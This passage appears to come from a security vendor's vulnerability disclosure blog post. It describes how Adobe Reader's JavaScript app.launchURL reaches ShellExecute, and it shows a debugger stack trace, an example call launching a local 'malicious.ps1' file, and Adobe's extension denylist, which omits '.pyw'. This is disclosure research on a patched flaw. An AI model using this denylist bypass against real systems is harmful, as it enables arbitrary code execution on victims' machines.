<p>Setting a breakpoint on kernel32!CreateProcessW, I noticed that it creates a process using shell32!ShellExecute.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694c693ebe6522281640" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
Breakpoint 1 hit
eax=00000000 ebx=00000000 ecx=00000001 edx=00000001 esi=040ff8d4 edi=000002e4
eip=75a0103d esp=040ff824 ebp=040ff918 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
kernel32!CreateProcessW:
75a0103d 68c0441200      push    1244C0h
0:014&gt; k
 # ChildEBP RetAddr  
00 040ff820 74bb558d kernel32!CreateProcessW
01 040ff918 74bc2b96 SHELL32!_SHCreateProcess+0x251
02 040ff96c 74bb5391 SHELL32!CExecuteApplication::_CreateProcess+0xfc
03 040ff97c 74bb5345 SHELL32!CExecuteApplication::_TryCreateProcess+0x2e
04 040ff98c 74bb4791 SHELL32!CExecuteApplication::_DoApplication+0x48
05 040ff99c 74bcf619 SHELL32!CExecuteApplication::Execute+0x33
06 040ff9bc 74bb49dc SHELL32!CExecuteAssociation::_DoCommand+0x88
07 040ff9e0 74bcf69b SHELL32!CExecuteAssociation::_TryApplication+0x41</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694c693ebe6522281640-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c693ebe6522281640-2">2</div><div class="crayon-num" data-line="crayon-5f694c693ebe6522281640-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c693ebe6522281640-4">4</div><div class="crayon-num" data-line="crayon-5f694c693ebe6522281640-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c693ebe6522281640-6">6</div><div class="crayon-num" data-line="crayon-5f694c693ebe6522281640-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c693ebe6522281640-8">8</div><div class="crayon-num" data-line="crayon-5f694c693ebe6522281640-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c693ebe6522281640-10">10</div><div class="crayon-num" data-line="crayon-5f694c693ebe6522281640-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c693ebe6522281640-12">12</div><div class="crayon-num" data-line="crayon-5f694c693ebe6522281640-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c693ebe6522281640-14">14</div><div class="crayon-num" data-line="crayon-5f694c693ebe6522281640-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c693ebe6522281640-16">16</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694c693ebe6522281640-1"><span class="crayon-i">Breakpoint</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-e">hit</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c693ebe6522281640-2"><span class="crayon-v">eax</span><span class="crayon-o">=</span><span class="crayon-cn">00000000</span><span class="crayon-h"> </span><span class="crayon-v">ebx</span><span class="crayon-o">=</span><span class="crayon-cn">00000000</span><span class="crayon-h"> </span><span class="crayon-v">ecx</span><span class="crayon-o">=</span><span class="crayon-cn">00000001</span><span class="crayon-h"> </span><span class="crayon-v">edx</span><span class="crayon-o">=</span><span class="crayon-cn">00000001</span><span class="crayon-h"> </span><span class="crayon-v">esi</span><span class="crayon-o">=</span><span class="crayon-cn">040ff8d4</span><span class="crayon-h"> </span><span class="crayon-v">edi</span><span class="crayon-o">=</span><span class="crayon-cn">000002e4</span></div><div class="crayon-line" id="crayon-5f694c693ebe6522281640-3"><span class="crayon-v">eip</span><span class="crayon-o">=</span><span class="crayon-cn">75a0103d</span><span class="crayon-h"> </span><span class="crayon-v">esp</span><span class="crayon-o">=</span><span class="crayon-cn">040ff824</span><span class="crayon-h"> </span><span class="crayon-v">ebp</span><span class="crayon-o">=</span><span class="crayon-cn">040ff918</span><span class="crayon-h"> </span><span class="crayon-v">iopl</span><span class="crayon-o">=</span><span class="crayon-cn">0</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">nv </span><span class="crayon-e">up </span><span class="crayon-e">ei </span><span class="crayon-e">pl </span><span class="crayon-e">zr </span><span class="crayon-e">na </span><span class="crayon-e">pe </span><span class="crayon-e">nc</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c693ebe6522281640-4"><span class="crayon-v">cs</span><span class="crayon-o">=</span><span class="crayon-cn">0023</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">ss</span><span class="crayon-o">=</span><span class="crayon-cn">002b</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">ds</span><span class="crayon-o">=</span><span class="crayon-cn">002b</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">es</span><span class="crayon-o">=</span><span class="crayon-cn">002b</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">fs</span><span class="crayon-o">=</span><span class="crayon-cn">0053</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">gs</span><span class="crayon-o">=</span><span class="crayon-cn">002b</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">efl</span><span class="crayon-o">=</span><span class="crayon-cn">00000246</span></div><div class="crayon-line" id="crayon-5f694c693ebe6522281640-5"><span class="crayon-v">kernel32</span><span class="crayon-o">!</span><span class="crayon-v">CreateProcessW</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c693ebe6522281640-6"><span class="crayon-cn">75a0103d</span><span class="crayon-h"> </span><span class="crayon-cn">68c0441200</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">push</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-cn">1244C0h</span></div><div class="crayon-line" id="crayon-5f694c693ebe6522281640-7"><span class="crayon-cn">0</span><span class="crayon-o">:</span><span class="crayon-cn">014</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-v">k</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c693ebe6522281640-8"><span class="crayon-h"> </span><span class="crayon-p"># ChildEBP RetAddr&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-5f694c693ebe6522281640-9"><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-cn">040ff820</span><span class="crayon-h"> </span><span class="crayon-cn">74bb558d</span><span class="crayon-h"> </span><span class="crayon-v">kernel32</span><span class="crayon-o">!</span><span class="crayon-i">CreateProcessW</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c693ebe6522281640-10"><span class="crayon-cn">01</span><span class="crayon-h"> </span><span class="crayon-cn">040ff918</span><span class="crayon-h"> </span><span class="crayon-cn">74bc2b96</span><span class="crayon-h"> </span><span class="crayon-v">SHELL32</span><span class="crayon-o">!</span><span class="crayon-v">_SHCreateProcess</span><span class="crayon-o">+</span><span class="crayon-cn">0x251</span></div><div class="crayon-line" id="crayon-5f694c693ebe6522281640-11"><span class="crayon-cn">02</span><span class="crayon-h"> </span><span class="crayon-cn">040ff96c</span><span class="crayon-h"> </span><span class="crayon-cn">74bb5391</span><span class="crayon-h"> </span><span class="crayon-v">SHELL32</span><span class="crayon-o">!</span><span class="crayon-v">CExecuteApplication</span><span class="crayon-o">::</span><span class="crayon-v">_CreateProcess</span><span class="crayon-o">+</span><span class="crayon-cn">0xfc</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c693ebe6522281640-12"><span class="crayon-cn">03</span><span class="crayon-h"> </span><span class="crayon-cn">040ff97c</span><span class="crayon-h"> </span><span class="crayon-cn">74bb5345</span><span class="crayon-h"> </span><span class="crayon-v">SHELL32</span><span class="crayon-o">!</span><span class="crayon-v">CExecuteApplication</span><span class="crayon-o">::</span><span class="crayon-v">_TryCreateProcess</span><span class="crayon-o">+</span><span class="crayon-cn">0x2e</span></div><div class="crayon-line" id="crayon-5f694c693ebe6522281640-13"><span class="crayon-cn">04</span><span class="crayon-h"> </span><span class="crayon-cn">040ff98c</span><span class="crayon-h"> </span><span class="crayon-cn">74bb4791</span><span class="crayon-h"> </span><span class="crayon-v">SHELL32</span><span class="crayon-o">!</span><span class="crayon-v">CExecuteApplication</span><span class="crayon-o">::</span><span class="crayon-v">_DoApplication</span><span class="crayon-o">+</span><span class="crayon-cn">0x48</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c693ebe6522281640-14"><span class="crayon-cn">05</span><span class="crayon-h"> </span><span class="crayon-cn">040ff99c</span><span class="crayon-h"> </span><span class="crayon-cn">74bcf619</span><span class="crayon-h"> </span><span class="crayon-v">SHELL32</span><span class="crayon-o">!</span><span class="crayon-v">CExecuteApplication</span><span class="crayon-o">::</span><span class="crayon-v">Execute</span><span class="crayon-o">+</span><span class="crayon-cn">0x33</span></div><div class="crayon-line" id="crayon-5f694c693ebe6522281640-15"><span class="crayon-cn">06</span><span class="crayon-h"> </span><span class="crayon-cn">040ff9bc</span><span class="crayon-h"> </span><span class="crayon-cn">74bb49dc</span><span class="crayon-h"> </span><span class="crayon-v">SHELL32</span><span class="crayon-o">!</span><span class="crayon-v">CExecuteAssociation</span><span class="crayon-o">::</span><span class="crayon-v">_DoCommand</span><span class="crayon-o">+</span><span class="crayon-cn">0x88</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c693ebe6522281640-16"><span class="crayon-cn">07</span><span class="crayon-h"> </span><span class="crayon-cn">040ff9e0</span><span class="crayon-h"> </span><span class="crayon-cn">74bcf69b</span><span class="crayon-h"> </span><span class="crayon-v">SHELL32</span><span class="crayon-o">!</span><span class="crayon-v">CExecuteAssociation</span><span class="crayon-o">::</span><span class="crayon-v">_TryApplication</span><span class="crayon-o">+</span><span class="crayon-cn">0x41</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0013 seconds] -->
<p>The shell32!ShellExecute function is a winapi that launches the right process, given a file and an optional protocol handler. It knows which process to launch, matching a registry key for a protocol/extension. That is why the default browser is launched when calling app.launchURL – it registers itself as the handler of the ‘http:’ protocol. You can read more about it in the <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/bb762153%28v=vs.85%29.aspx?f=255&amp;MSPPError=-2147217396">MSDN page for ShellExecute</a>.</p>
<p>As opposed to what the documentation of app.launchURL states, you <u>can</u> launch a URL beginning with the ‘file://’. The only difference is that there’s a message box asking users whether they accept launching an application from that path. This means that we can call shell32!ShellExecute with an arbitrary path and an arbitrary extension. So I tried launching a PowerShell script ending with the ‘ps1’ extension.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694c693ebe8948797297" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
app.launchURL("file://c:/temp/malicious.ps1");</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694c693ebe8948797297-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694c693ebe8948797297-1"><span class="crayon-v">app</span><span class="crayon-sy">.</span><span class="crayon-e">launchURL</span><span class="crayon-sy">(</span><span class="crayon-s">"file://c:/temp/malicious.ps1"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p>That didn’t work; no PowerShell script was executed.</p>
<h3>Extensions Denylist</h3>
<p>Adobe did think that giving the ability to call shell32!ShellExecute is dangerous, so they created a denylist for all extensions they think allow an attacker to execute arbitrary code. That denylist is found under the following registry key:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694c693ebe9181370986" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Adobe\Acrobat Reader\11.0\FeatureLockDown\cDefaultLaunchAttachmentPerms </textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694c693ebe9181370986-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694c693ebe9181370986-1"><span class="crayon-v">HKEY_LOCAL_MACHINE</span><span class="crayon-sy">\</span><span class="crayon-v">SOFTWARE</span><span class="crayon-sy">\</span><span class="crayon-v">Policies</span><span class="crayon-sy">\</span><span class="crayon-v">Adobe</span><span class="crayon-sy">\</span><span class="crayon-e">Acrobat </span><span class="crayon-v">Reader</span><span class="crayon-sy">\</span><span class="crayon-cn">11.0</span><span class="crayon-sy">\</span><span class="crayon-v">FeatureLockDown</span><span class="crayon-sy">\</span><span class="crayon-i">cDefaultLaunchAttachmentPerms</span><span class="crayon-h"> </span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694c693ebeb132108224" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
.ade:3|.adp:3|.app:3|.arc:3|.arj:3|.asp:3|.bas:3|.bat:3|.bz:3|.bz2:3|.cab:3|.chm:3|.class:3|.cmd:3|.com:3|.command:3|…</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694c693ebeb132108224-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694c693ebeb132108224-1"><span class="crayon-sy">.</span><span class="crayon-v">ade</span><span class="crayon-o">:</span><span class="crayon-cn">3</span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-v">adp</span><span class="crayon-o">:</span><span class="crayon-cn">3</span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-v">app</span><span class="crayon-o">:</span><span class="crayon-cn">3</span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-v">arc</span><span class="crayon-o">:</span><span class="crayon-cn">3</span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-v">arj</span><span class="crayon-o">:</span><span class="crayon-cn">3</span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-v">asp</span><span class="crayon-o">:</span><span class="crayon-cn">3</span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-v">bas</span><span class="crayon-o">:</span><span class="crayon-cn">3</span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-v">bat</span><span class="crayon-o">:</span><span class="crayon-cn">3</span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-v">bz</span><span class="crayon-o">:</span><span class="crayon-cn">3</span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-v">bz2</span><span class="crayon-o">:</span><span class="crayon-cn">3</span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-v">cab</span><span class="crayon-o">:</span><span class="crayon-cn">3</span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-v">chm</span><span class="crayon-o">:</span><span class="crayon-cn">3</span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-t">class</span><span class="crayon-o">:</span><span class="crayon-cn">3</span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-v">cmd</span><span class="crayon-o">:</span><span class="crayon-cn">3</span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-v">com</span><span class="crayon-o">:</span><span class="crayon-cn">3</span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-v">command</span><span class="crayon-o">:</span><span class="crayon-cn">3</span><span class="crayon-o">|</span>…</div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0005 seconds] -->
<p>I reviewed the list, trying to find an extension Adobe forgot to denylist. They did quite a good job of excluding all trivial extensions. I noticed that they tried to prevent Python scripts from executing:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694c693ebec506531367" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
.py:3|.pyc:3|.pyo:3|.pyd:3|…</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694c693ebec506531367-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694c693ebec506531367-1"><span class="crayon-sy">.</span><span class="crayon-v">py</span><span class="crayon-o">:</span><span class="crayon-cn">3</span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-v">pyc</span><span class="crayon-o">:</span><span class="crayon-cn">3</span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-v">pyo</span><span class="crayon-o">:</span><span class="crayon-cn">3</span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-v">pyd</span><span class="crayon-o">:</span><span class="crayon-cn">3</span><span class="crayon-o">|</span>…</div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p>But they forgot to denylist the ‘.pyw’ extension, which corresponds to Python File (no console). This means that an attacker can execute arbitrary Python scripts (if installed) using app.launchURL.</p>
<h3>Conclusion</h3>
<p>The JavaScript engine that Adobe implements contains functions that can introduce potential security vulnerabilities. In order to enforce security measures for the JavaScript API, they introduced features such as secured and trusted functions. But it is possible to abuse the nature of the JavaScript language to cause some unexpected behaviors when combined with those security features. Their efforts to mitigate such issues are thorough, but there still appear to be viable exploitation pathways. We thank Adobe for their quick attention to the issues described in this post, and for the <a href="https://helpx.adobe.com/security/products/acrobat/apsb16-33.html">release of the October 6 patch</a>.</p>
<p>Palo Alto Networks customers who deploy our <a href="https://www.paloaltonetworks.com/products/designing-for-prevention/security-platform">Next-Generation Security Platform</a> are protected from zero-day vulnerabilities such as these. Threat Prevention (an essential service for our next-generation firewalls that includes capabilities such as <a href="https://www.paloaltonetworks.com/features/application-visibility">application control</a>, <a href="https://www.paloaltonetworks.com/features/ips">IPS</a>, <a href="https://www.paloaltonetworks.com/features/anti-malware">anti-malware</a>, and <a href="https://www.paloaltonetworks.com/features/command-control">command and control protection</a>), <a href="https://www.paloaltonetworks.com/products/secure-the-network/subscriptions/wildfire">WildFire</a>, and <a href="https://www.paloaltonetworks.com/products/secure-the-network/subscriptions/url-filtering-pandb">URL Filtering</a> services provide our customers with comprehensive protection and automatic updates against previously unknown threats within as little as 5 minutes.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/10/ZeroDay_6.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-20985" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/10/ZeroDay_6.png" alt="zeroday_6" width="708" height="507" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/10/ZeroDay_6.png 708w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/10/ZeroDay_6-300x215.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/10/ZeroDay_6-370x265.png 370w" sizes="(max-width: 708px) 100vw, 708px" /></a></p>
          <div class="article__subscribe mb-40 text-gray-400 bg-gray-200 rounded-lg">
  <h4 class="h3 mb-10 text-black">Get updates from <br class="d-sm-none"> Palo Alto<br class="d-sm-none"> Networks!</h4>
  <p>Sign up to receive the latest news, cyber threat intelligence and research from us</p>
  <!-- <form action="https://app-guse4001.marketo.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe"> -->
  <form action="https://start.paloaltonetworks.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe">
    <input type="hidden" value="1086" name="formid">
    <!-- <input type="hidden" value="818-CZC-273" name="munchkinId"> -->
    <input type="hidden" value="531-OCS-018" name="munchkinId">
    <input type="hidden" value="2141" name="lpId">
    <input type="hidden" value="1086" name="formVid">
    <input type="hidden" name="mkto_optinunit42" value="true">
    <input type="hidden" name="mkto_opt-in" value="true">
    <div class="row">
      <div class="col-sm col-12 mb-sm-0 mb-15">
        <input type="email" name="Email" placeholder="Email address" class="subscribe-field d-block w-100 px-sm-25 px-15 bg-white">
        <p class="error-mail d-none mt-15 text-danger" style="color: #dc3545">Please enter your email address!</p>
      </div>
      <div class="col-sm-auto col-12">
          <input type="submit" value="Subscribe" class="btn btn--black btn--sm w-100" disabled="disabled">
      </div>
    </div>

    <div class="google-recapth mt-15">
      <div class="g-recaptcha" data-expired-callback="captchaExpires" data-callback="captchaComplete" data-sitekey="6LfKOrwUAAAAAOwgjxrEcx-pcfwe8OquUw6ommTK"></div>
      <p class="error-recaptcha d-none mt-15 text-danger" style="color: #dc3545">Please mark, I'm not a robot!</p>
    </div>
  </form>

  <div class="font-size-ex-sm col-sm-7 p-0">
    <p>By submitting this form, you agree to our <a href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a> and acknowledge our <a href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy Statement</a>.</p>
  </div>
</div>

<script type="text/javascript" src="https://researchcenter.paloaltonetworks.com/wp-content/plugins/google-analyticator/external-tracking.min.js?ver=6.4.9"></script>
        </div>
      </div>
    </div>
  </article>
<footer class="site-footer px-sm-0 px-15">
  <div class="pt-40">
    <div class="container pt-sm-30">
      <div class="row justify-content-lg-center">
        <div class="col-lg-11 col-12">
          <div class="row">
            <div class="col-lg-4 col-sm-3 col-12 order-sm-2">
              <nav class="footer-socials mb-sm-0 mb-25 text-white text-sm-right">
                                                <a href="https://twitter.com/Unit42_Intel" target="_blank"><span class="ui ui-4"></span></a>
                <a href="https://github.com/pan-unit42" target="_blank"><span class="ui ui-5"></span></a>
              </nav>
            </div>

            <div class="col-lg-8 col-sm-9 col-12 order-sm-1">
              <div class="row">
